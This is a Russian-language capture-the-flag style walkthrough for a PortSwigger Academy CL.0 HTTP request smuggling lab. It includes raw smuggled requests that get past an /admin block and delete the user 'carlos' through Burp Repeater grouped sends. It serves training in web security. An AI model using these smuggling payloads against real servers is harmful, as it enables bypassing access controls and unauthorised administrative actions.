Перейдем на уязвимый ресурс 

Перейдем в Proxy -> HTTP history и изучим запросы в дельте


найдем запрос 
```
GET /resources/images/blog.svg
```
и отправим его в `Repeater`

а так же отправим в `Repeater` запрос на корневую страницу
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/15.%20CL.0%20request%20smuggling/pics%20for%20walkthrough/1.png)

```
POST /resources/images/blog.svg HTTP/1.1
Host: 0ad4000b03cdb98b82d4292f0051000f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

GET /asfasjfbifbuiqwfbqobnfwioqbf HTTP/1.1
X-ignore: x
```

и в ответ увидим 400 ошибку
```
"error":"Invalid request"
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/15.%20CL.0%20request%20smuggling/pics%20for%20walkthrough/2.png)

 и соответственно, наш обычный запрос `GET /` принесет на 200 статус респонс код
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/15.%20CL.0%20request%20smuggling/pics%20for%20walkthrough/3.png)

добавим в наш первый запрос хэдер `Connection: keep-alive` и итоге получим 


```
POST /resources/images/blog.svg HTTP/1.1
Host: 0ad4000b03cdb98b82d4292f0051000f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Connection: keep-alive

GET /asfasjfbifbuiqwfbqobnfwioqbf HTTP/1.1
X-ignore: x
```
Далее объединим запросы в группу

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/15.%20CL.0%20request%20smuggling/pics%20for%20walkthrough/4.png)

далее выберем `Send group in sequence (single connection)`.

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/15.%20CL.0%20request%20smuggling/pics%20for%20walkthrough/5.png)


после отправки у нас на первом запросе будет 200 респонс статус код

а вот на втором - 400
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/15.%20CL.0%20request%20smuggling/pics%20for%20walkthrough/6.png)

Так же перейдя по 
```
https://0ad4000b03cdb98b82d4292f0051000f.web-security-academy.net/admin
```
 в браузере (кнопка Admin panel) увидим
`"Path /admin is blocked"`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/15.%20CL.0%20request%20smuggling/pics%20for%20walkthrough/7.png)

не проблема, поправим в нашем запросе

```
POST /resources/images/blog.svg HTTP/1.1
Host: 0ad4000b03cdb98b82d4292f0051000f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Connection: keep-alive

GET /admin HTTP/1.1
X-ignore: x
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/15.%20CL.0%20request%20smuggling/pics%20for%20walkthrough/8.png)

Вновь отправим в скоупе
и видим, что нас пустило на админскую панель

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/15.%20CL.0%20request%20smuggling/pics%20for%20walkthrough/9.png)

отлично, удалим карлоса как это и требует задание



```
POST /resources/images/blog.svg HTTP/1.1
Host: 0ad4000b03cdb98b82d4292f0051000f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Connection: keep-alive

GET /admin/delete?username=carlos HTTP/1.1
X-ignore: x
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/15.%20CL.0%20request%20smuggling/pics%20for%20walkthrough/10.png)
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/15.%20CL.0%20request%20smuggling/pics%20for%20walkthrough/11.png)

и получим уведомление об успешно выполненной лабораторной работе

